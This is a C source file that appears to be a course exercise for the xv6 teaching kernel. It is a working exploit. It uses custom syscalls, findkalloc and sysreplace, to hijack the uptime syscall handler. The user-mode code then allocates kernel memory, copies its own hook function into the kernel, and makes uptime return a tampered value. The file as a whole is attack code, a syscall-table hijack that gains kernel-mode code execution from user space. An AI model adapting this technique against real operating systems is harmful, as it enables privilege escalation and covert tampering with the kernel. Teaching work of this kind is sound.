#include"types.h"
#include"user.h"
int (*f)(void);
char* (*k)(void);
char *kernel_pointer;
int old_func_add;
int myuptime(void);
int exploit_stage1(void);

int main(void)
{
int kalloc_add;
kalloc_add=findkalloc();
k=(void *)kalloc_add;
printf(1,"the value of uptime is %d \n",uptime());
sysreplace(14,(int)exploit_stage1,(int)&old_func_add);
uptime();

//printf(1, "the old and new add of uptime and add of kernel is 0x%x and 0x%x \n",kernel_pointer,(int *)(myuptime-4));
sysreplace(14,(int)(kernel_pointer+4),(int)&old_func_add);
printf(1,"the value of uptime is %d \n",uptime());
//printf(1, "the old and new add of uptime is 0x%x and 0x%x  \n",(void *)f,(void *)(*(int *)kernel_pointer));

exit();
}
int myuptime(void)
{
  __asm__ ( "call L1;"
                "L1:pop %eax;"
    );
register int x asm ("%eax");
x-=15;
//return x;
int (*fpointer)(void);
fpointer=(void *)*((int *)x);
return (fpointer()+50000);

  //return 5000;
}
int exploit_stage1()
{
  kernel_pointer=k();
  memmove(kernel_pointer+4,(void *)myuptime,(uint)(exploit_stage1-myuptime));
  memmove(kernel_pointer,(void *)(&old_func_add),4);
  //f=(void *)(*(int *)(kernel_pointer+4));
  return 1;
}

